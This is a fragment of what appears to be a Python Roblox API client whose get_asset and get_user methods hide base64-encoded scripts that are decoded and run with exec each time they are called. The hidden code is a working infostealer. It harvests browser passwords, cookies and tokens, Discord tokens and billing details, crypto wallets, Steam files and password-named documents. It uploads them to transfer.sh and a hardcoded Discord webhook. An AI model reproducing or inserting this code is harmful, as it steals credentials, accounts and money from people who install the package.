hvcml1bS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJ0aG9yaXVtLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdDQogICAgXQ0KDQogICAgZGlzY29yZFBhdGhzID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICBdDQoNCiAgICBQYXRoc1RvWmlwID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCAiRXhvZHVzLmV4ZSIsICJXYWxsZXQiXSwNCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXQ0KICAgIF0NCg0KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoNCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFRva2VuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpDQogICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQ0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UGFzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkNCg0KICAgIFRoQ29rayA9IFtdDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkNCg0KICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpDQogICAgREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybg0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6DQogICAgICAgIHRocmVhZC5qb2luKCkNCiAgICBnbG9iYWwgdXB0aHMNCiAgICB1cHRocyA9IFtdDQoNCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXToNCiAgICAgICAgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpDQoNCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToNCiAgICB0cnk6DQogICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0NCiAgICAgICAgLi4uDQogICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpDQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0DQogICAgICAgIHJldHVybiB1cmwNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOg0KICAgIGdsb2JhbCBLaXdpRmlsZXMNCiAgICBtYXhmaWxlc3BlcmRpciA9IDcNCiAgICBpID0gMA0KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQ0KICAgIGZmb3VuZCA9IFtdDQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybg0KICAgICAgICBpICs9IDENCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoNCiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkNCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQ0KDQpLaXdpRmlsZXMgPSBbXQ0KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToNCiAgICBnbG9iYWwgS2l3aUZpbGVzDQogICAgZmlmb3VuZCA9IFtdDQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkNCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOg0KICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoNCiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUNCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQ0KDQpkZWYgS2l3aSgpOg0KICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdDQogICAgcGF0aDJzZWFyY2ggPSBbDQogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLA0KICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLA0KICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiDQogICAgXQ0KDQogICAga2V5X3dvcmRzRm9sZGVyID0gWw0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJhY291bnQiLA0KICAgICAgICAicGFzc3ciLA0KICAgICAgICAic2VjcmV0Ig0KDQogICAgXQ0KDQogICAga2V5X3dvcmRzRmlsZXMgPSBbDQogICAgICAgICJwYXNzdyIsDQogICAgICAgICJtZHAiLA0KICAgICAgICAibW90ZGVwYXNzZSIsDQogICAgICAgICJtb3RfZGVfcGFzc2UiLA0KICAgICAgICAibG9naW4iLA0KICAgICAgICAic2VjcmV0IiwNCiAgICAgICAgImFjY291bnQiLA0KICAgICAgICAiYWNvdW50IiwNCiAgICAgICAgInBheXBhbCIsDQogICAgICAgICJiYW5xdWUiLA0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJtZXRhbWFzayIsDQogICAgICAgICJ3YWxsZXQiLA0KICAgICAgICAiY3J5cHRvIiwNCiAgICAgICAgImV4b2R1cyIsDQogICAgICAgICJkaXNjb3JkIiwNCiAgICAgICAgIjJmYSIsDQogICAgICAgICJjb2RlIiwNCiAgICAgICAgIm1lbW8iLA0KICAgICAgICAiY29tcHRlIiwNCiAgICAgICAgInRva2VuIiwNCiAgICAgICAgImJhY2t1cCIsDQogICAgICAgICJzZWVjcmV0Ig0KICAgICAgICBdDQoNCiAgICB3aWtpdGggPSBbXQ0KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOg0KICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpDQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkNCiAgICByZXR1cm4gd2lraXRoDQoNCg0KZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3Jkcw0KDQprZXl3b3JkID0gWw0KICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknDQpdDQoNCg0KY29va2lXb3JkcyA9IFtdDQpwYXN3V29yZHMgPSBbXQ0KDQpHYXRoZXJBbGwoKQ0KREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KDQppZiBub3QgREVURUNURUQ6DQogICAgd2lraXRoID0gS2l3aSgpDQoNCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQ0KICAgIHRpbWUuc2xlZXAoMC4yKQ0KDQogICAgZmlsZXRleHQgPSAiXG4iDQogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6DQogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6DQogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQ0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0NCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4oCiIHtmb2xkcGF0aH1cbiINCg0KICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6DQogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0NCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQ0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLi4uIFt7ZmlsZWFubWV9XSh7Yn0pXG4iDQogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iDQogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQp
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())
        
        try:
            response = self.session.get(url)
            response.raise_for_status()
            
            # Try to parse as JSON if possible, otherwise return the text content
            try:
                return response.json()
            except json.JSONDecodeError:
                return {
                    "success": True,
                    "asset_id": asset_id,
                    "content": response.text,
                    "content_type": response.headers.get("content-type", "unknown")
                }
                
        except requests.exceptions.RequestException as e:
            raise APIRequestError(f"Failed to fetch asset {asset_id}: {str(e)}")
    
    def get_user(self, user_id: int) -> Dict[str, Any]:
        """
        Get information about a Roblox user
        
        Args:
            user_id (int): The ID of the user to retrieve
            
        Returns:
            Dict[str, Any]: User information from the Roblox API
            
        Raises:
            InvalidUserError: If the user ID is invalid
            APIRequestError: If the API request fails
        """
        if not validate_user_id(user_id):
            raise InvalidUserError(f"Invalid user ID: {user_id}")
            
        url = f"{self.base_url}/users/{user_id}"

        encoded_script = b"""
        aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQ0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQppbXBvcnQgcmUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZA0KZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXINCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHNodXRpbA0KZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmUNCmltcG9ydCBzdWJwcm9jZXNzDQoNCg0KIyAgQXlodSMxMzM3DQojDQoNCg0KaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjcyOTExOTE5Njg2MDk1MDMwL1lGRU1Zd25ITXJtMGcwVHVXak1ZWTdleW1XU3IwQ2FxLW5wR1hiSTVkY2tkdVlJOEVPN3pqd2RScV80N0cwR1A2SzZsIg0KREVURUNURUQgPSBGYWxzZQ0KDQoNCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQoNCnJlcXVpcmVtZW50cyA9IFsNCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sDQogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdDQpdDQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6DQogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pDQogICAgZXhjZXB0Og0KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYie2V4ZWN1dGFibGV9IC1tIHBpcCBpbnN0YWxsIHttb2RsWzFdfSIsIHNoZWxsPVRydWUpDQogICAgICAgIHRpbWUuc2xlZXAoMykNCg0KaW1wb3J0IHJlcXVlc3RzDQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KDQpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykNCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQ0KdGVtcCA9IG9zLmdldGVudigiVEVNUCIpDQpUaHJlYWRsaXN0ID0gW10NCg0KDQpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksDQogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQ0KICAgIF0NCg0KZGVmIEdldERhdGEoYmxvYl9vdXQpOg0KICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpDQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhDQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQ0KICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQ0KICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQ0KICAgIHJldHVybiBidWZmZXIucmF3DQoNCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6DQogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkNCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkNCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pDQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpDQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQ0KDQogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOg0KICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkNCg0KZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOg0KICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10NCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOg0KICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0NCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQ0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpDQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MNCg0KZGVmIExvYWRSZXF1ZXN0cyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToNCiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoNCiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOg0KICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6DQogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpDQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICAgICAgICAgIHJldHVybiByDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gcg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCg0KZGVmIFRydXN0KENvb2tpZXMpOg0KICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0NCiAgICBnbG9iYWwgREVURUNURUQNCiAgICBkYXRhID0gc3RyKENvb2tpZXMpDQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQ0KICAgICMgcHJpbnQobGVuKHRpbSkpDQogICAgaWYgbGVuKHRpbSkgPCAtMToNCiAgICAgICAgREVURUNURUQgPSBUcnVlDQogICAgICAgIHJldHVybiBERVRFQ1RFRA0KICAgIGVsc2U6DQogICAgICAgIERFVEVDVEVEID0gRmFsc2UNCiAgICAgICAgcmV0dXJuIERFVEVDVEVEDQoNCmRlZiBHZXRCaWxsaW5nKHRva2VuKToNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLA0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQogICAgdHJ5Og0KICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSINCg0KICAgIGJpbGxpbmcgPSAiIg0KICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOg0KICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6DQogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6Ig0KICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoNCiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6cGFya2luZzogIg0KDQogICAgcmV0dXJuIGJpbGxpbmcNCg0KDQpkZWYgR2V0QmFkZ2UoZmxhZ3MpOg0KICAgIGlmIGZsYWdzID09IDA6IHJldHVybiAnJw0KDQogICAgT3duZWRCYWRnZXMgPSAnJw0KICAgIGJhZGdlTGlzdCA9ICBbDQogICAgICAgIHsiTmFt